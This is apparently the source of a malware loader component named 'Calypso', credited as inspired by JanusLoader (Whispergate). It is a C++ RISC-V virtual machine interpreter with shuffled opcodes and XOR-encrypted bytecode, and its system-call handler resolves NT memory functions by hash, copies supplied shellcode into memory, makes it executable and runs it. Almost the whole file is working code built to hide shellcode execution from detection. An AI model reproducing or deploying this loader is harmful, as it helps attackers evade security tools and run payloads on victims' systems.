// Calypso - RISC-V VM Execution Engine (RV64IM)
// Inspired by JanusLoader (Whispergate)
// Full RV64IM interpreter with Fisher-Yates opcode shuffle and XOR encryption

struct RiscVm {
    int64_t  regs[32];
    uint64_t pc;
    uint8_t* mem;
    size_t   mem_size;
    bool     halted;
};

static inline uint32_t rv_op(uint32_t i)   { return (i >> 2) & 0x1F; }
static inline uint32_t rv_rd(uint32_t i)   { return (i >> 7) & 0x1F; }
static inline uint32_t rv_f3(uint32_t i)   { return (i >> 12) & 0x7; }
static inline uint32_t rv_rs1(uint32_t i)  { return (i >> 15) & 0x1F; }
static inline uint32_t rv_rs2(uint32_t i)  { return (i >> 20) & 0x1F; }
static inline uint32_t rv_f7(uint32_t i)   { return (i >> 25) & 0x7F; }

static inline int64_t rv_imm_i(uint32_t i) { return (int32_t)i >> 20; }
static inline int64_t rv_imm_u(uint32_t i) { return (int32_t)(i & 0xFFFFF000); }
static inline int64_t rv_imm_s(uint32_t i) {
    return ((int32_t)(i & 0xFE000000) >> 20) | ((i >> 7) & 0x1F);
}
static inline int64_t rv_imm_b(uint32_t i) {
    return ((int32_t)(i & 0x80000000) >> 19)
         | ((i & 0x80) << 4)
         | ((i >> 20) & 0x7E0)
         | ((i >> 7) & 0x1E);
}
static inline int64_t rv_imm_j(uint32_t i) {
    return ((int32_t)(i & 0x80000000) >> 11)
         | (i & 0xFF000)
         | ((i >> 9) & 0x800)
         | ((i >> 20) & 0x7FE);
}

static inline void rv_wreg(RiscVm* vm, uint32_t rd, int64_t val) {
    if (rd != 0) vm->regs[rd] = val;
}
static inline void rv_adv(RiscVm* vm) { vm->pc += 4; }
static inline uint32_t rv_fetch(RiscVm* vm) {
    return *(uint32_t*)(vm->mem + vm->pc);
}

static void rv_gen_perm(uint32_t seed, uint8_t perm[32]) {
    for (int i = 0; i < 32; i++) perm[i] = (uint8_t)i;
    for (int i = 31; i > 0; i--) {
        seed = seed * 1664525 + 1013904223;
        int j = (int)((seed >> 17) % (uint32_t)(i + 1));
        uint8_t tmp = perm[i];
        perm[i] = perm[j];
        perm[j] = tmp;
    }
}

enum RvEcall : int64_t {
    RV_ECALL_EXEC_SC = 4,
    RV_ECALL_EXIT    = 3,
};

static void rv_handle_ecall(RiscVm* vm) {
    int64_t ecall_id = vm->regs[17]; // a7
    switch (ecall_id) {
        case RV_ECALL_EXEC_SC: {
            uint8_t* sc   = reinterpret_cast<uint8_t*>(vm->regs[10]); // a0
            size_t sc_len = static_cast<size_t>(vm->regs[11]);         // a1
            auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
            auto NtPVM = get_syscall_fn<NtProtectVirtualMemory_t>(HASH_NtProtectVirtualMemory);
            if (!NtAVM || !NtPVM) { vm->halted = true; break; }
            HANDLE hProc = GetCurrentProcess();
            PVOID base = nullptr;
            SIZE_T size = sc_len;
            NtAVM(hProc, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!base) { vm->halted = true; break; }
            memcpy(base, sc, sc_len);
            ULONG old_prot;
            NtPVM(hProc, &base, &size, PAGE_EXECUTE_READ, &old_prot);
            auto fn = reinterpret_cast<void(*)()>(base);
            fn();
            break;
        }
        case RV_ECALL_EXIT:
            vm->halted = true;
            break;
        default:
            break;
    }
}

using RvHandler = void(*)(RiscVm*, uint32_t);

static void rv_lui(RiscVm* vm, uint32_t inst) {
    rv_wreg(vm, rv_rd(inst), rv_imm_u(inst));
    rv_adv(vm);
}

static void rv_auipc(RiscVm* vm, uint32_t inst) {
    rv_wreg(vm, rv_rd(inst), (int64_t)vm->pc + rv_imm_u(inst));
    rv_adv(vm);
}

static void rv_jal(RiscVm* vm, uint32_t inst) {
    rv_wreg(vm, rv_rd(inst), (int64_t)(vm->pc + 4));
    vm->pc = (uint64_t)((int64_t)vm->pc + rv_imm_j(inst));
}

static void rv_jalr(RiscVm* vm, uint32_t inst) {
    int64_t target = (vm->regs[rv_rs1(inst)] + rv_imm_i(inst)) & ~(int64_t)1;
    rv_wreg(vm, rv_rd(inst), (int64_t)(vm->pc + 4));
    vm->pc = (uint64_t)target;
}

static void rv_branch(RiscVm* vm, uint32_t inst) {
    int64_t a = vm->regs[rv_rs1(inst)];
    int64_t b = vm->regs[rv_rs2(inst)];
    bool taken = false;
    switch (rv_f3(inst)) {
        case 0: taken = (a == b); break;
        case 1: taken = (a != b); break;
        case 4: taken = (a < b); break;
        case 5: taken = (a >= b); break;
        case 6: taken = ((uint64_t)a < (uint64_t)b); break;
        case 7: taken = ((uint64_t)a >= (uint64_t)b); break;
    }
    if (taken) vm->pc = (uint64_t)((int64_t)vm->pc + rv_imm_b(inst));
    else       rv_adv(vm);
}

static void rv_load(RiscVm* vm, uint32_t inst) {
    int64_t addr = vm->regs[rv_rs1(inst)] + rv_imm_i(inst);
    int64_t val = 0;
    switch (rv_f3(inst)) {
        case 0: { int8_t   v; memcpy(&v, (void*)addr, 1); val = v; break; }
        case 1: { int16_t  v; memcpy(&v, (void*)addr, 2); val = v; break; }
        case 2: { int32_t  v; memcpy(&v, (void*)addr, 4); val = v; break; }
        case 3: { int64_t  v; memcpy(&v, (void*)addr, 8); val = v; break; }
        case 4: { uint8_t  v; memcpy(&v, (void*)addr, 1); val = v; break; }
        case 5: { uint16_t v; memcpy(&v, (void*)addr, 2); val = v; break; }
        case 6: { uint32_t v; memcpy(&v, (void*)addr, 4); val = v; break; }
    }
    rv_wreg(vm, rv_rd(inst), val);
    rv_adv(vm);
}

static void rv_store(RiscVm* vm, uint32_t inst) {
    int64_t addr = vm->regs[rv_rs1(inst)] + rv_imm_s(inst);
    int64_t val = vm->regs[rv_rs2(inst)];
    switch (rv_f3(inst)) {
        case 0: { int8_t  v = (int8_t)val;  memcpy((void*)addr, &v, 1); break; }
        case 1: { int16_t v = (int16_t)val; memcpy((void*)addr, &v, 2); break; }
        case 2: { int32_t v = (int32_t)val; memcpy((void*)addr, &v, 4); break; }
        case 3: { int64_t v = val;           memcpy((void*)addr, &v, 8); break; }
    }
    rv_adv(vm);
}

static void rv_op_imm(RiscVm* vm, uint32_t inst) {
    int64_t src = vm->regs[rv_rs1(inst)];
    int64_t imm = rv_imm_i(inst);
    int64_t result = 0;
    uint32_t shamt = (uint32_t)imm & 0x3F;
    switch (rv_f3(inst)) {
        case 0: result = src + imm; break;
        case 1: result = src << shamt; break;
        case 2: result = (src < imm) ? 1 : 0; break;
        case 3: result = ((uint64_t)src < (uint64_t)imm) ? 1 : 0; break;
        case 4: result = src ^ imm; break;
        case 5:
            if (rv_f7(inst) & 0x20) result = src >> shamt;
            else result = (int64_t)((uint64_t)src >> shamt);
            break;
        case 6: result = src | imm; break;
        case 7: result = src & imm; break;
    }
    rv_wreg(vm, rv_rd(inst), result);
    rv_adv(vm);
}

static void rv_op_imm32(RiscVm* vm, uint32_t inst) {
    int32_t src = (int32_t)vm->regs[rv_rs1(inst)];
    int32_t imm = (int32_t)rv_imm_i(inst);
    int32_t result = 0;
    uint32_t shamt = (uint32_t)imm & 0x1F;
    switch (rv_f3(inst)) {
        case 0: result = src + imm; break;
        case 1: result = src << shamt; break;
        case 5:
            if (rv_f7(inst) & 0x20) result = src >> shamt;
            else result = (int32_t)((uint32_t)src >> shamt);
            break;
    }
    rv_wreg(vm, rv_rd(inst), (int64_t)result);
    rv_adv(vm);
}

static void rv_op_reg(RiscVm* vm, uint32_t inst) {
    int64_t a = vm->regs[rv_rs1(inst)];
    int64_t b = vm->regs[rv_rs2(inst)];
    int64_t result = 0;
    uint32_t f7 = rv_f7(inst);
    uint32_t f3 = rv_f3(inst);

    if (f7 == 0x01) {
        switch (f3) {
            case 0: result = a * b; break;
            case 1: {
                __int128 r = (__int128)a * (__int128)b;
                result = (int64_t)(r >> 64); break;
            }
            case 2: {
                __int128 r = (__int128)a * (unsigned __int128)(uint64_t)b;
                result = (int64_t)(r >> 64); break;
            }
            case 3: {
                unsigned __int128 r = (unsigned __int128)(uint64_t)a * (unsigned __int128)(uint64_t)b;
                result = (int64_t)(uint64_t)(r >> 64); break;
            }
            case 4: result = b ? a / b : -1; break;
            case 5: result = b ? (int64_t)((uint64_t)a / (uint64_t)b) : (int64_t)~0ULL; break;
            case 6: result = b ? a % b : a; break;
            case 7: result = b ? (int64_t)((uint64_t)a % (uint64_t)b) : a; break;
        }
    } else {
        switch (f3) {
            case 0: result = (f7 & 0x20) ? a - b : a + b; break;
            case 1: result = a << ((uint64_t)b & 0x3F); break;
            case 2: result = (a < b) ? 1 : 0; break;
            case 3: result = ((uint64_t)a < (uint64_t)b) ? 1 : 0; break;
            case 4: result = a ^ b; break;
            case 5:
                if (f7 & 0x20) result = a >> ((uint64_t)b & 0x3F);
                else result = (int64_t)((uint64_t)a >> ((uint64_t)b & 0x3F));
                break;
            case 6: result = a | b; break;
            case 7: result = a & b; break;
        }
    }
    rv_wreg(vm, rv_rd(inst), result);
    rv_adv(vm);
}

static void rv_op32(RiscVm* vm, uint32_t inst) {
    int32_t a = (int32_t)vm->regs[rv_rs1(inst)];
    int32_t b = (int32_t)vm->regs[rv_rs2(inst)];
    int32_t result = 0;
    uint32_t f7 = rv_f7(inst);
    uint32_t f3 = rv_f3(inst);

    if (f7 == 0x01) {
        switch (f3) {
            case 0: result = a * b; break;
            case 4: result = b ? a / b : -1; break;
            case 5: result = b ? (int32_t)((uint32_t)a / (uint32_t)b) : (int32_t)~0u; break;
            case 6: result = b ? a % b : a; break;
            case 7: result = b ? (int32_t)((uint32_t)a % (uint32_t)b) : a; break;
        }
    } else {
        switch (f3) {
            case 0: result = (f7 & 0x20) ? a - b : a + b; break;
            case 1: result = a << (b & 0x1F); break;
            case 5:
                if (f7 & 0x20) result = a >> (b & 0x1F);
                else result = (int32_t)((uint32_t)a >> (b & 0x1F));
                break;
        }
    }
    rv_wreg(vm, rv_rd(inst), (int64_t)result);
    rv_adv(vm);
}

static void rv_misc_mem(RiscVm* vm, uint32_t) { rv_adv(vm); }

static void rv_system(RiscVm* vm, uint32_t inst) {
    uint32_t f3 = rv_f3(inst);
    if (f3 == 0) {
        uint32_t imm12 = (inst >> 20) & 0xFFF;
        if (imm12 == 0) rv_handle_ecall(vm);
        else if (imm12 == 1) vm->halted = true;
    }
    rv_adv(vm);
}

static void rv_unknown(RiscVm* vm, uint32_t) { vm->halted = true; }

static void rv_xor_decrypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++)
        data[i] ^= (key ^ ((i * 0x67) & 0xFF));
}

static void riscvm_run(RiscVm* vm, const uint8_t perm[32]) {
    RvHandler table[32];
    for (int i = 0; i < 32; i++) table[i] = rv_unknown;

    table[perm[0x0D]] = rv_lui;
    table[perm[0x05]] = rv_auipc;
    table[perm[0x1B]] = rv_jal;
    table[perm[0x19]] = rv_jalr;
    table[perm[0x18]] = rv_branch;
    table[perm[0x00]] = rv_load;
    table[perm[0x08]] = rv_store;
    table[perm[0x04]] = rv_op_imm;
    table[perm[0x0C]] = rv_op_reg;
    table[perm[0x06]] = rv_op_imm32;
    table[perm[0x0E]] = rv_op32;
    table[perm[0x03]] = rv_misc_mem;
    table[perm[0x1C]] = rv_system;

    while (!vm->halted) {
        uint32_t inst = rv_fetch(vm);
        uint32_t op = rv_op(inst);
        table[op](vm, inst);
        vm->regs[0] = 0;
    }
}

static bool vm_riscv_execute(uint8_t* shellcode, size_t sc_len,
                             uint8_t* rv_code, size_t rv_code_len,
                             uint32_t opcode_seed, uint8_t xor_key) {
    rv_xor_decrypt(rv_code, rv_code_len, xor_key);

    uint8_t perm[32];
    rv_gen_perm(opcode_seed, perm);

    constexpr size_t RV_STACK_SIZE = 1024 * 1024;
    size_t mem_size = rv_code_len + RV_STACK_SIZE;
    uint8_t* mem = (uint8_t*)VirtualAlloc(nullptr, mem_size,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return false;
    memcpy(mem, rv_code, rv_code_len);

    RiscVm vm = {};
    vm.mem = mem;
    vm.mem_size = mem_size;
    vm.pc = 0;
    vm.halted = false;

    vm.regs[10] = reinterpret_cast<int64_t>(shellcode);
    vm.regs[11] = static_cast<int64_t>(sc_len);
    vm.regs[17] = RV_ECALL_EXEC_SC;
    vm.regs[2]  = reinterpret_cast<int64_t>(mem + mem_size);

    riscvm_run(&vm, perm);

    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}
